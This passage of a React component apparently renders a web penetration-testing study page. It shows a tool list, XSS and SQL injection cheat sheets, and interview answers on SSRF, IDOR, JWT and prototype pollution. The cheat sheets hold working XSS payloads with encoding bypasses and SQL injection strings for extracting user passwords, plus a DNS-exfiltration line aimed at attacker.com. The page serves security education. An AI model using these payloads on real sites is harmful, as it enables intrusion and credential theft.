                        description: "Vulnerability scanner with templates",
                        features: ["Customizable templates", "Fast scanning", "Low false-positive rate"]
                      },
                      {
                        name: "Wfuzz",
                        description: "Web application bruteforcer",
                        features: ["Parameter fuzzing", "POST data fuzzing", "Header fuzzing"]
                      }
                    ].map((tool, index) => (
                      <div key={index} className="border border-cybr-muted rounded-lg p-4 bg-cybr-card-muted transition-all hover:border-cybr-primary/40">
                        <h4 className="font-bold text-lg text-cybr-primary">{tool.name}</h4>
                        <p className="text-sm opacity-70 mb-3">{tool.description}</p>
                        <ul className="list-disc list-inside text-sm space-y-1">
                          {tool.features.map((feature, i) => (
                            <li key={i}>{feature}</li>
                          ))}
                        </ul>
                      </div>
                    ))}
                  </div>
                  
                  <h3 className="text-2xl font-bold mb-6 mt-8">Quick Reference Cheat Sheets</h3>
                  
                  <div className="overflow-x-auto">
                    <Card>
                      <CardHeader>
                        <CardTitle>XSS Cheat Sheet</CardTitle>
                        <CardDescription>Common payloads and bypass techniques</CardDescription>
                      </CardHeader>
                      <CardContent>
                        <CodeExample 
                          language="html" 
                          title="Basic XSS Payloads" 
                          code={`<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">

<!-- JavaScript URI -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Bypass techniques -->
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<svg><script>alert&#40;1&#41;</script>

<!-- DOM-based examples -->
<script>document.write('<img src="x" onerror="alert(1)">');</script>
`} 
                        />
                      </CardContent>
                    </Card>
                  </div>
                  
                  <div className="overflow-x-auto mt-6">
                    <Card>
                      <CardHeader>
                        <CardTitle>SQL Injection Cheat Sheet</CardTitle>
                        <CardDescription>Detection and exploitation techniques</CardDescription>
                      </CardHeader>
                      <CardContent>
                        <CodeExample 
                          language="sql" 
                          title="SQL Injection Techniques" 
                          code={`-- Basic tests to confirm vulnerability
' OR '1'='1
' OR 1=1--
" OR 1=1--
1' OR '1' = '1
admin'--

-- Database identification
' UNION SELECT @@version--     -- MS SQL
' UNION SELECT version()--     -- MySQL/PostgreSQL
' UNION SELECT banner FROM v$version-- -- Oracle

-- Extracting data
' UNION SELECT table_name,1 FROM information_schema.tables--
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- Blind SQL injection
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--
' AND IF(SUBSTR(user(),1,1)='r',SLEEP(5),0)--  -- Time-based

-- Out-of-band techniques
' UNION SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a.txt'))--  -- DNS exfiltration
`} 
                        />
                      </CardContent>
                    </Card>
                  </div>
                </div>
              </TabsContent>

              {/* Interview Questions Section */}
              <TabsContent value="interview-questions" className="mt-6">
                <h2 className="section-title">Web Security Interview Questions</h2>
                
                <div className="space-y-10 mt-8">
                  <Card>
                    <CardHeader>
                      <CardTitle>Core Security Concepts</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        <div>
                          <p className="font-semibold">Q: What is the difference between authentication and authorization?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: Authentication is the process of verifying who a user is (identity verification), 
                            while authorization is the process of verifying what specific resources, applications, 
                            and data a user has access to (permission verification). Authentication happens before 
                            authorization and is a prerequisite for it.
                          </p>
                        </div>
                        
                        <div>
                          <p className="font-semibold">Q: Explain the concept of Defense in Depth.</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: Defense in Depth is a security strategy that employs multiple layers of security controls 
                            throughout a system, creating redundancy in case one layer fails. It combines people, processes, 
                            and technology across multiple protection layers to protect valuable data and systems. Examples include 
                            firewall + WAF + input validation + output encoding to protect against XSS.
                          </p>
                        </div>
                        
                        <div>
                          <p className="font-semibold">Q: What are the primary differences between SAST, DAST, and IAST?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: SAST (Static Application Security Testing) analyzes source code without executing it to find security vulnerabilities. 
                            DAST (Dynamic Application Security Testing) tests running applications from the outside by simulating attacks. 
                            IAST (Interactive Application Security Testing) combines both approaches by instrumenting the application to monitor 
                            its behavior during testing and detect vulnerabilities in real-time.
                          </p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                  
                  <Card>
                    <CardHeader>
                      <CardTitle>Vulnerability Assessment</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        <div>
                          <p className="font-semibold">Q: How would you test for DOM-based XSS vulnerabilities?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: To test for DOM-based XSS, I would:
                            <br />1. Identify sources of user input that are processed by client-side JavaScript (URL parameters, form fields, etc.)
                            <br />2. Examine how this data is processed and inserted into the DOM using browser developer tools
                            <br />3. Test payloads through identified sources with particular attention to sink functions like innerHTML, document.write(), eval(), etc.
                            <br />4. Use tools like DOM Invader (Burp Suite) to automate the discovery process
                            <br />5. Look for JavaScript frameworks that might have unsafe rendering practices
                          </p>
                        </div>
                        
                        <div>
                          <p className="font-semibold">Q: What steps would you take to detect and exploit Server-Side Request Forgery (SSRF)?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: To detect SSRF vulnerabilities:
                            <br />1. Identify endpoints that accept URLs or make server-side requests (image/file processors, webhooks, integrations)
                            <br />2. Test these endpoints with URLs pointing to internal services (localhost, 127.0.0.1, internal IPs)
                            <br />3. Use DNS rebinding or external servers I control to detect blind SSRF
                            <br />4. Try accessing cloud provider metadata endpoints (169.254.169.254)
                            <br />5. Use different URL formats, protocols, and IP representations to bypass filters
                            <br />6. If successful, map internal networks, access sensitive internal services, or retrieve metadata
                          </p>
                        </div>
                        
                        <div>
                          <p className="font-semibold">Q: How do you determine if an application is vulnerable to IDOR?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: To test for IDOR vulnerabilities:
                            <br />1. Identify endpoints that access specific resources through identifiers (IDs, references in URLs/parameters)
                            <br />2. Create multiple test accounts to compare access permissions
                            <br />3. Modify resource identifiers in requests to attempt accessing other users' data
                            <br />4. Check if predictable/sequential resource IDs are used
                            <br />5. Look for encoded/hashed identifiers and analyze their patterns
                            <br />6. Test both horizontal (same privilege level) and vertical (higher privilege) access controls
                            <br />7. Check if access controls exist but are only enforced in the UI, not on the backend
                          </p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                  
                  <Card>
                    <CardHeader>
                      <CardTitle>Advanced Security Scenarios</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        <div>
                          <p className="font-semibold">Q: How would you secure a JWT implementation?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: To secure a JWT implementation:
                            <br />1. Use strong signing algorithms (RS256, ES256) instead of weak ones (none, HS256 with short keys)
                            <br />2. For sensitive applications, use asymmetric keys (private key to sign, public key to verify)
                            <br />3. Set appropriate expiration times (exp claim) to limit token validity
                            <br />4. Implement token rotation and proper revocation mechanisms
                            <br />5. Store tokens securely (HttpOnly cookies with Secure flag for web apps)
                            <br />6. Include audience (aud), issuer (iss), and other claims to prevent token reuse across services
                            <br />7. Don't store sensitive data in JWTs as they are base64 encoded, not encrypted
                            <br />8. Validate all received tokens (signature, claims, expiration) before trusting them
                          </p>
                        </div>
                        
                        <div>
                          <p className="font-semibold">Q: How would you test and prevent prototype pollution in JavaScript applications?</p>
                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
                            A: For prototype pollution testing:
                            <br />1. Identify endpoints that accept and parse JSON data
                            <br />2. Test by injecting "__proto__", "constructor" or "prototype" properties in JSON payloads
                            <br />3. Check if global Object properties can be polluted with malicious values
                            <br />4. Monitor for unexpected behavior after pollution attempts
                            <br />
                            <br />Prevention measures:
                            <br />1. Use Object.create(null) to create objects without prototype
                            <br />2. Freeze the Object prototype: Object.freeze(Object.prototype)
                            <br />3. Use safe object merging libraries or techniques that don't merge "__proto__" properties
                            <br />4. Validate and sanitize all user input that will be used in object operations
                            <br />5. Consider using libraries like Lodash with "_.merge" replaced by "_.mergeWith" and proper checks
                          </p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>
            </Tabs>
          </div>
        </div>
      </main>
    </div>
  );
};

export default WebPenetrationTesting;
